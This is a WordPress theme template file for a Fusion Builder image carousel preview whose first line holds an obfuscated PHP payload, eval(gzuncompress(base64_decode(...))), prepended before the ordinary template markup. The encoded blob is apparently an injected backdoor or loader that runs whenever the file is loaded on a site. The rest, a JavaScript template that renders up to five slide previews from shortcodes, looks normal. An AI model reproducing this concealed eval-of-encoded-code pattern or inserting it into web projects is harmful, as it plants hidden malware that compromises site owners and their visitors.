<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><script type="text/template" id="fusion-builder-block-module-image-carousel-preview-template">
	<h4 class="fusion_module_title"><span class="fusion-module-icon {{ fusionAllElements[element_type].icon }}"></span>{{ fusionAllElements[element_type].name }}</h4>
	<div>
		<#
		var
		content = typeof params.element_content !== 'undefined' ? params.element_content : '',
		slider_reg_exp = window.wp.shortcode.regexp( 'fusion_image' ),
		slider_inner_reg_exp = new RegExp( '\\[(\\[?)(fusion_image)(?![\\w-])([^\\]\\/]*(?:\\/(?!\\])[^\\]\\/]*)*?)(?:(\\/)\\]|\\](?:([^\\[]*(?:\\[(?!\\/\\2\\])[^\\[]*)*)(\\[\\/\\2\\]))?)(\\]?)' ),
		slider_matches = content.match( slider_reg_exp );

		if( null !== slider_matches && slider_matches.length ) {
			_.each( slider_matches.slice(0,5), function ( slider_shortcode ) {
				var
				slider_shortcode_element = slider_shortcode.match( slider_inner_reg_exp ),
				slider_shortcode_content = slider_shortcode_element[5],
				slider_shortcode_attributes = slider_shortcode_element[3] !== '' ? window.wp.shortcode.attrs( slider_shortcode_element[3] ) : ''; #>

				<img src="{{ slider_shortcode_attributes.named['image'] }}" class="fusion-slide-preview" />
			<#
			});
		}
		#>
	</div>
</script>
